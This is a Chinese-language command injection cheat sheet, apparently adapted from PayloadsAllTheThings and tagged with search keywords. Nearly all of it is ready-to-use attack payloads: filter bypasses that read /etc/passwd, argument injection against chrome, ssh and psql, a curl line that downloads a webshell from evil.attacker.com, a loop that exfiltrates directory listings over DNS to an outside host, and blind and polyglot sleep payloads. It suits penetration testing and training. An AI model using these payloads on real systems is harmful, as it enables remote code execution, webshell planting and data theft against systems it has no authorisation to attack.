# Command Injection - 命令注入

[SEARCH_KEYWORDS]
漏洞类型: Command Injection OS Command Injection 命令注入 命令执行
攻击类型: RCE Remote Code Execution Arbitrary Command Execution
关键词: system exec shell popen passthru backticks 反引号 分号 管道
连接符: ; && || | & \n
绕过技术: IFS Space Bypass Quote Bypass Wildcards Hex Encoding Brace Expansion
数据泄露: Time Based DNS Based Blind Exfiltration

[CONTENT]

## 命令注入概述

命令注入是一种安全漏洞，允许攻击者在易受攻击的应用程序中执行任意命令。当应用程序将不安全的用户 supplied 数据传递给系统shell时，就会存在此漏洞。

## 命令连接符

| 连接符 | 说明 |
|--------|------|
| `;` | 顺序执行多个命令 |
| `&&` | 前一个成功才执行后一个 |
| `\|\|` | 前一个失败才执行后一个 |
| `&` | 后台执行 |
| `\|` | 管道，将前一个输出作为后一个输入 |

```powershell
command1; command2    # 顺序执行
command1 && command2  # command1成功后执行command2
command1 || command2  # command1失败后执行command2
command1 & command2   # command1后台执行
command1 | command2   # 管道
```

## 过滤器绕过

### 无空格绕过

```powershell
# IFS变量
cat${IFS}/etc/passwd
ls${IFS}-la

# 大括号展开
{cat,/etc/passwd}

# 输入重定向
cat</etc/passwd

# ANSI-C引用
X=$'uname\x20-a'&&$X

# Tab字符
;ls%09-al%09/home

# Windows
ping%CommonProgramFiles:~10,-18%127.0.0.1
```

### 引号绕过

```powershell
# 单引号
w'h'o'am'i
wh''oami

# 双引号
w"h"o"am"i
wh""oami

# 反引号
wh``oami
```

### 反斜杠绕过

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

### 十六进制编码绕过

```powershell
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
```

### 大括号展开绕过

```powershell
{,ip,a}
{,ifconfig}
{l,-lh}s
{,/?s?/?i?/c?t,/e??/p??s??,}
```

### 通配符绕过

```powershell
/???/??t /???/p??s??
powershell C:\*\*2\n??e*d.*?  # notepad
```

### 变量展开绕过

```powershell
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
```

### $()和$@绕过

```powershell
who$()ami
who$(echo am)i
who`echo am`i
who$@ami
echo whoami|$0
```

## 参数注入

### Chrome

```powershell
chrome '--gpu-launcher="id>/tmp/foo"'
```

### SSH

```powershell
ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
```

### psql

```powershell
psql -o'|id>/tmp/foo'
```

### curl (写webshell)

```powershell
curl http://evil.attacker.com/ -o webshell.php
```

## 命令内注入

```bash
# 反引号
original_cmd_by_server `cat /etc/passwd`

# 命令替换
original_cmd_by_server $(cat /etc/passwd)
```

## 数据外带

### 时间盲注

```powershell
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```

### DNS外带

```powershell
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

## 多语言命令注入 (Polyglot)

```powershell
# 示例1
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

# 示例2
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

## 技巧

### 后台运行长命令

```bash
nohup sleep 120 > /dev/null &
```

### 移除注入后参数

使用 `--` 符号表示命令选项结束。

## 工具

- commix - 自动化命令注入利用工具
- interactsh - OOB交互收集服务器

## 参考文档

原始来源: PayloadsAllTheThings/Command Injection/README.md